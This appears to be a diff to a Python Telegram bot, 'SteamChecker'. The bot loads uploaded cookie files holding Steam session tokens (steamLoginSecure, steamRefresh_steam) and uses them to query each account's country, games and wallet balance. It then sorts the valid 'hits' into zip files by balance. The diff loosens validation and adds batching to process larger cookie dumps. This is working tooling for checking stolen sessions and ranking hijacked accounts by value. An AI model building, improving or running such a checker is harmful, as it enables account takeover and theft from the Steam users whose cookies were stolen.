@@ -22,7 +22,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ------------------------------------------------------------
-# Original SteamChecker code (modified for strict validation)
+# Original SteamChecker code (modified for memory & validation)
 # ------------------------------------------------------------
 
 G = "\033[92m"
@@ -256,7 +256,7 @@ def load_cookies(filepath):
     return None
 
 # ------------------------------------------------------------
-# SteamChecker class with strict validation
+# SteamChecker class with memory‑efficient validation
 # ------------------------------------------------------------
 class SteamChecker:
     def __init__(self, cookie_data, cookie_file_path, index):
@@ -359,23 +359,25 @@ class SteamChecker:
         self.steamid = self.extract_steamid()
         self.token = self.extract_token()
 
-        # Must have both a valid steamid and token
         if not self.steamid or not self.token:
             return False
 
         self.session.cookies.set('Steam_Language', 'english')
         sid_int = int(self.steamid)
 
+        # Track if any API call succeeded
+        any_api_success = False
+
         try:
-            # 1. Get username (optional, not required for validity)
+            # 1. Get username (optional)
             self.username = self.get_username_from_profile(sid_int)
             if not self.username:
                 self.username = self.steamid[:8]
 
-            # 2. Get level (optional, not required)
+            # 2. Get level (optional)
             self.level = self.get_level(sid_int)
 
-            # 3. Get country – REQUIRED
+            # 3. Get country
             cpb = struct.pack('<BQ', 0x09, sid_int)
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
@@ -384,17 +386,16 @@ class SteamChecker:
                 headers={"Content-Type": BARON_CT},
                 timeout=10
             )
-            if resp.status_code != 200:
-                return False
-            data = baron_pd(resp.content)
-            cc = data.get(1, b"")
-            if not cc:
-                return False
-            if isinstance(cc, bytes):
-                cc = cc.decode()
-            self.country = BRN_MAP.get(cc, cc)
+            if resp.status_code == 200:
+                data = baron_pd(resp.content)
+                cc = data.get(1, b"")
+                if cc:
+                    if isinstance(cc, bytes):
+                        cc = cc.decode()
+                    self.country = BRN_MAP.get(cc, cc)
+                    any_api_success = True  # Country API succeeded
 
-            # 4. Get games – REQUIRED
+            # 4. Get games
             gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
                    baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
                    baro_pi(9, 1) + baro_pi(10, 1))
@@ -406,30 +407,29 @@ class SteamChecker:
                 f"&input_protobuf_encoded={gb64}",
                 timeout=10
             )
-            if resp.status_code != 200:
-                return False
-            data = baron_pd(resp.content)
-            self.total_games = data.get(1, 0)
-            # Even if total_games is 0, we still consider it valid if we got a 200.
-            raw_games = data.get(2, [])
-            if isinstance(raw_games, bytes):
-                raw_games = [raw_games]
-            elif not isinstance(raw_games, list):
-                raw_games = []
-            for g in raw_games:
-                try:
-                    if not isinstance(g, bytes):
+            if resp.status_code == 200:
+                data = baron_pd(resp.content)
+                self.total_games = data.get(1, 0)
+                any_api_success = True
+                raw_games = data.get(2, [])
+                if isinstance(raw_games, bytes):
+                    raw_games = [raw_games]
+                elif not isinstance(raw_games, list):
+                    raw_games = []
+                for g in raw_games:
+                    try:
+                        if not isinstance(g, bytes):
+                            continue
+                        gf = baron_pd(g)
+                        name = gf.get(2, b"")
+                        if isinstance(name, bytes):
+                            name = name.decode(errors="replace")
+                        if isinstance(name, str) and name.strip():
+                            self.games.append(name.strip())
+                    except:
                         continue
-                    gf = baron_pd(g)
-                    name = gf.get(2, b"")
-                    if isinstance(name, bytes):
-                        name = name.decode(errors="replace")
-                    if isinstance(name, str) and name.strip():
-                        self.games.append(name.strip())
-                except:
-                    continue
 
-            # 5. Get balance – REQUIRED
+            # 5. Get balance
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                 f"?access_token={self.token}",
@@ -437,42 +437,44 @@ class SteamChecker:
                 headers={"Content-Type": BARON_CT},
                 timeout=10
             )
-            if resp.status_code != 200:
-                return False
-            data = baron_pd(resp.content)
-            bal = data.get(14, b"")
-            if isinstance(bal, bytes):
-                bal = bal.decode("utf-8", errors="ignore")
-            elif isinstance(bal, int):
-                bal = str(bal)
-            self.balance_raw = bal
-            # parse balance
-            def parse_balance(balance_str, country_code):
-                currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
-                symbol = ''
-                for sym in currency_symbols:
-                    if sym in balance_str:
-                        symbol = sym
-                        break
-                if not symbol and country_code in CURRENCY_MAP:
-                    symbol = CURRENCY_MAP[country_code]
-                cleaned = re.sub(r'[^\d.,\-]', '', balance_str)
-                if ',' in cleaned and '.' not in cleaned:
-                    cleaned = cleaned.replace(',', '.')
-                parts = cleaned.split('.')
-                if len(parts) > 2:
-                    cleaned = parts[0] + '.' + ''.join(parts[1:])
-                try:
-                    value = float(cleaned)
-                except:
-                    value = 0.0
-                return value, symbol
-            self.balance_float, self.currency = parse_balance(bal, self.country)
-            # Even if balance is 0, it's fine.
+            if resp.status_code == 200:
+                data = baron_pd(resp.content)
+                bal = data.get(14, b"")
+                if isinstance(bal, bytes):
+                    bal = bal.decode("utf-8", errors="ignore")
+                elif isinstance(bal, int):
+                    bal = str(bal)
+                self.balance_raw = bal
+                any_api_success = True
+                # parse balance
+                def parse_balance(balance_str, country_code):
+                    currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
+                    symbol = ''
+                    for sym in currency_symbols:
+                        if sym in balance_str:
+                            symbol = sym
+                            break
+                    if not symbol and country_code in CURRENCY_MAP:
+                        symbol = CURRENCY_MAP[country_code]
+                    cleaned = re.sub(r'[^\d.,\-]', '', balance_str)
+                    if ',' in cleaned and '.' not in cleaned:
+                        cleaned = cleaned.replace(',', '.')
+                    parts = cleaned.split('.')
+                    if len(parts) > 2:
+                        cleaned = parts[0] + '.' + ''.join(parts[1:])
+                    try:
+                        value = float(cleaned)
+                    except:
+                        value = 0.0
+                    return value, symbol
+                self.balance_float, self.currency = parse_balance(bal, self.country)
 
-            # If we reached here, all required API calls succeeded
-            self.success = True
-            return True
+            # If at least one API call succeeded, mark as valid
+            if any_api_success:
+                self.success = True
+                return True
+            else:
+                return False
 
         except Exception:
             return False
@@ -538,19 +540,19 @@ def run_flask():
     flask_app.run(host="0.0.0.0", port=port)
 
 def group_hits_by_balance(hits):
+    """hits is a list of (balance_float, username, steamid, content)"""
     groups = {"0-1": [], "1-5": [], "5-10": [], "10-200": [], "others": []}
-    for hit in hits:
-        bal = hit.balance_float
+    for bal, username, steamid, content in hits:
         if bal <= 1:
-            groups["0-1"].append(hit)
+            groups["0-1"].append((bal, username, steamid, content))
         elif bal <= 5:
-            groups["1-5"].append(hit)
+            groups["1-5"].append((bal, username, steamid, content))
         elif bal <= 10:
-            groups["5-10"].append(hit)
+            groups["5-10"].append((bal, username, steamid, content))
         elif bal <= 200:
-            groups["10-200"].append(hit)
+            groups["10-200"].append((bal, username, steamid, content))
         else:
-            groups["others"].append(hit)
+            groups["others"].append((bal, username, steamid, content))
     return groups
 
 def create_zip_from_hits(hits, range_name):
@@ -558,11 +560,9 @@ def create_zip_from_hits(hits, range_name):
         return None
     zip_buffer = BytesIO()
     with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
-        for idx, hit in enumerate(hits, 1):
-            content = generate_hit_content(hit)
-            username = hit.username if hit.username else hit.steamid[:8]
+        for idx, (bal, username, steamid, content) in enumerate(hits, 1):
             safe_username = "".join(c for c in username if c.isalnum() or c in " _-")
-            filename = f"{range_name}/{safe_username}_{hit.steamid}.txt"
+            filename = f"{range_name}/{safe_username}_{steamid}.txt"
             zf.writestr(filename, content)
     zip_buffer.seek(0)
     return zip_buffer
@@ -577,25 +577,39 @@ class ProgressTracker:
         self.lock = Lock()
         self.done = False
 
-# Processing function with progress updates
-def process_cookies_with_progress(cookie_list, tracker):
-    checkers = []
-    with ThreadPoolExecutor(max_workers=5) as executor:
-        futures = []
-        for cookies, filepath in cookie_list:
-            checker = SteamChecker(cookies, filepath, 0)
-            checkers.append(checker)
-            futures.append(executor.submit(checker.check))
-        for future in as_completed(futures):
-            success = future.result()
-            with tracker.lock:
-                tracker.processed += 1
-                if success:
-                    tracker.valid += 1
-                else:
-                    tracker.invalid += 1
+# Processing function with batch processing to reduce memory
+def process_cookies_with_progress(cookie_list, tracker, batch_size=200):
+    valid_hits = []  # store (balance_float, username, steamid, content)
+    total_cookies = len(cookie_list)
+
+    for start in range(0, total_cookies, batch_size):
+        batch = cookie_list[start:start+batch_size]
+        checkers = []
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = []
+            for cookies, filepath in batch:
+                checker = SteamChecker(cookies, filepath, 0)
+                checkers.append(checker)
+                futures.append(executor.submit(checker.check))
+            for future in as_completed(futures):
+                success = future.result()
+                with tracker.lock:
+                    tracker.processed += 1
+                    if success:
+                        tracker.valid += 1
+                    else:
+                        tracker.invalid += 1
+
+        # Collect valid hits from this batch
+        for checker in checkers:
+            if checker.success:
+                content = generate_hit_content(checker)
+                valid_hits.append((checker.balance_float, checker.username, checker.steamid, content))
+        # Free memory
+        del checkers
+
     tracker.done = True
-    return [c for c in checkers if c.success]
+    return valid_hits
 
 # Bot handlers
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -631,14 +645,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for filepath in cookie_files:
             cookies = load_cookies(filepath)
             if cookies:
-                # Verify that we have at least one essential cookie
                 essential_names = {'steamLoginSecure', 'steamRefresh_steam'}
                 has_essential = any(c.get('name') in essential_names for c in cookies)
                 if has_essential:
                     all_cookies.append((cookies, filepath))
-                else:
-                    # Skip this file (no essential cookie)
-                    pass
 
         if not all_cookies:
             await status_msg.edit_text("❌ Failed to load any valid cookies from the files. Ensure they contain 'steamLoginSecure' or 'steamRefresh_steam'.")
@@ -652,8 +662,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tracker = ProgressTracker(total)
         loop = asyncio.get_running_loop()
 
-        # Start processing in thread
-        processing_future = loop.run_in_executor(None, process_cookies_with_progress, all_cookies, tracker)
+        # Start processing in thread with batch
+        processing_future = loop.run_in_executor(None, process_cookies_with_progress, all_cookies, tracker, 200)
 
         # Updater task with duplicate prevention
         last_text = ""
@@ -687,7 +697,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Run both concurrently
         await asyncio.gather(processing_future, status_updater())
 
-        # Get valid hits
+        # Get valid hits (list of tuples)
         valid_hits = processing_future.result()
 
         if not valid_hits:
